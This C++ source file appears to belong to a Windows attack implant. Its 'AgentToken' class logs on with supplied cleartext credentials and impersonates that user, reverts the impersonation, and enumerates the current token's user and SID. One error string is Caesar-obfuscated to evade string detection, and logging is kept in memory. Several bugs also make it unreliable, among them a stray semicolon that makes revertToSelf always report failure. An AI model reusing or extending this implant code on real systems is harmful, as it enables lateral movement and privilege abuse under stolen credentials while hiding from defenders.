#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0500
#endif  
#include "stdafx.h"
#include "AgentToken.h"
#include "string.h"
#include <iostream>
#include <Sddl.h> // for ConvertSidToStringSid()
#define MAX_NAME  256

bool AgentToken::revertToSelf()
{
	/*
	return to original token context.
	*/
	std::string tempErr;
	if(!RevertToSelf());
	{
		// Pipe failed to create 
		auto err = std::to_string(GetLastError());
		//tempErr.append("revertToSelf() FAILED revert of current token, error code: ");
		tempErr.append(s_to_caesar("bofobdDyCovp() PKSVON bofobd yp mebboxd dyuox, obbyb myno: ", -10 ));
		tempErr.append(err);
		memoryLog(4, tempErr);
		return false;
	}
	// completed with no issue
	return true;
}

bool AgentToken::makeToken(LPCWSTR username, LPCWSTR password, LPCWSTR domain)
{
	/*
	Make token from user and password
	*/
	memoryLog(0, "makeToken() started to make user token handle");
	DWORD dwResult = 0;
	HANDLE hToken;
	std::string tempErr;
	/*
	BOOL LogonUser(
		  _In_     LPTSTR  lpszUsername,
		  _In_opt_ LPTSTR  lpszDomain,
		  _In_opt_ LPTSTR  lpszPassword,
		  _In_     DWORD   dwLogonType,
		  _In_     DWORD   dwLogonProvider,
		  _Out_    PHANDLE phToken
		);
	*/
	if (domain == L"")
	{
		memoryLog(0, "makeToken() passed no domain setting '.'");
		domain = L".";
	}
	dwResult = LogonUser(
		username, 
		domain,
		password,
		LOGON32_LOGON_NETWORK_CLEARTEXT,
		LOGON32_PROVIDER_DEFAULT,
		&hToken
		);
	if (dwResult == 0)
	{
		// failed to logon user
		auto err = std::to_string(GetLastError());
		tempErr.append("makeToken() FAILED to LogonUser, error code: ");
		tempErr.append(err);
		memoryLog(3, tempErr);
		return false;
	}
	memoryLog(0, "makeToken() LogonUser successed, returned hToken handle ");
	/*
	BOOL WINAPI ImpersonateLoggedOnUser(
		_In_ HANDLE hToken
	);
	*/
	memoryLog(0, "makeToken() ImpersonateLoggedOnUser started");
	if (!ImpersonateLoggedOnUser(hToken))
	{
		// failed to impersonate 
		auto err = std::to_string(GetLastError());
		tempErr.append("makeToken() FAILED to ImpersonateLoggedOnUser, error code: ");
		tempErr.append(err);
		memoryLog(3, tempErr);
		return false;
	}
	memoryLog(0, "makeToken() ImpersonateLoggedOnUser successed, primary token inherited ");
	return true;
}

std::wstring AgentToken::sidToUser(PTOKEN_USER ti)
{
	/*
	Take in pointer to ti struc of sid and return
	the string version of the data.
	*/
	std::wstring finalResult;
	LPWSTR myTrusteeName = _T(""), myDomainName = _T("");
	myTrusteeName = (LPWSTR)GlobalAlloc(GMEM_FIXED, 255 * sizeof(wchar_t));
	myDomainName = (LPWSTR)GlobalAlloc(GMEM_FIXED, 255 * sizeof(wchar_t));
	SID_NAME_USE SidType;
	DWORD dwResult = 0;
	DWORD dwSize = MAX_NAME;
	std::string tempErr;

	if (LookupAccountSid(NULL,ti->User.Sid, myTrusteeName, &dwSize, myDomainName, &dwSize, &SidType))
	{
		if (dwResult == ERROR_NONE_MAPPED)
		{
			memoryLog(0, "sidToUser() LookupAccountSid failed to look up sid");
			myTrusteeName = L"NONE_MAPPED";
			myDomainName = L"NONE_MAPPED";
		}
		finalResult.append(myDomainName);
		finalResult.append(L"\\");
		finalResult.append(myTrusteeName);
		//std::wcout << finalResult << std::endl;
		return finalResult;
	}
	else
	{
		auto err = std::to_string(GetLastError());
		tempErr.append("sidToUser() LookupAccountSid failed to get handle, error code: ");
		tempErr.append(err);
		memoryLog(3, tempErr);
	}
	return std::wstring();
}

std::wstring AgentToken::enumCurrentToken()
{
	/*
	Open current process and get handle on 
	current token info.
	*/
	// Get a handle to the process.
	std::string tempErr;
	std::wstring finalOutput;
	DWORD dwSize = MAX_NAME;
	HANDLE hProcess;
	HANDLE hToken;
	DWORD dwResult = 0;
	memoryLog(0, "enumCurrentToken() started to enum current token");
	hProcess = GetCurrentProcess(); // Retrieves a pseudo handle for the current process.
	/*
	BOOL WINAPI OpenProcessToken(
		  _In_  HANDLE  ProcessHandle,
		  _In_  DWORD   DesiredAccess,
		  _Out_ PHANDLE TokenHandle
		);
	*/
	memoryLog(0, "enumCurrentToken() GetCurrentProcess got handle on current process");
	dwResult = OpenProcessToken(
		hProcess,
		TOKEN_QUERY, // Required to query an access token.
		&hToken // pointer to new token
		);
	if (!dwResult)
	{
		// failed to get token handel
		auto err = std::to_string(GetLastError());
		tempErr.append("enumCurrentToken() OpenProcessToken FAILED to get token handle, error code: ");
		tempErr.append(err);
		memoryLog(3, tempErr);
		CloseHandle(hProcess);
	}
	memoryLog(0, "enumCurrentToken() OpenProcessToken got handle on current token");
	/*
	BOOL WINAPI GetTokenInformation(
		  _In_      HANDLE                  TokenHandle,
		  _In_      TOKEN_INFORMATION_CLASS TokenInformationClass,
		  _Out_opt_ LPVOID                  TokenInformation,
		  _In_      DWORD                   TokenInformationLength,
		  _Out_     PDWORD                  ReturnLength
		);
	*/
	// retirve token user 
	PTOKEN_USER ti = NULL;
	DWORD TokenInformationLength;
	// we need to first obain the size 
	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &TokenInformationLength) && ERROR_INSUFFICIENT_BUFFER != GetLastError())
	{
		// cant get handle on token for size
		auto err = std::to_string(GetLastError());
		tempErr.append("enumCurrentToken() GetTokenInformation cant get handle on token for size: ");
		tempErr.append(err);
		memoryLog(3, tempErr);
		CloseHandle(hProcess);
		CloseHandle(hToken);
	}
	// now allocate correct size for struc
	if (NULL == (ti = (PTOKEN_USER)LocalAlloc(LPTR, TokenInformationLength))) //Combines LMEM_FIXED and LMEM_ZEROINIT (ZeroMem).
	{
		// bad request
		memoryLog(0, "enumCurrentToken() Failed to LocalAlloc size for GetTokenInformation struc");
	}
	
	dwResult = GetTokenInformation(
		hToken,
		TokenUser,
		(LPVOID)ti,
		TokenInformationLength,
		&TokenInformationLength
		);
	
	if (!dwResult)
	{
		// failed to get token handel
		auto err = std::to_string(GetLastError());
		tempErr.append("enumCurrentToken() GetTokenInformation FAILED to get token struc: ");
		tempErr.append(err);
		memoryLog(3, tempErr);
		// free the memory and close handles
		LocalFree((HLOCAL)ti);
		CloseHandle(hToken);
		CloseHandle(hProcess);
	}
	memoryLog(0, "enumCurrentToken() GetTokenInformation got TokenUser struc");
	// we should have user struc now
	// get user / domain of sid
	memoryLog(0, "enumCurrentToken() calling LookupAccountSid");
	std::wstring userDomain = sidToUser(ti);
	finalOutput.append(userDomain);
	finalOutput.append(L" - ");
	memoryLog(0, "enumCurrentToken() LookupAccountSid completed");
	// get string sid 
	LPTSTR StringSid = NULL;
	if (ConvertSidToStringSid(ti->User.Sid, &StringSid))
	{
		finalOutput.append(StringSid);
	}

	std::wcout << finalOutput << std::endl;
	LocalFree((HLOCAL)StringSid);
	LocalFree((HLOCAL)ti);
	CloseHandle(hToken);
	CloseHandle(hProcess);


	// ensure we close both handles and free local mem
	return finalOutput;
}






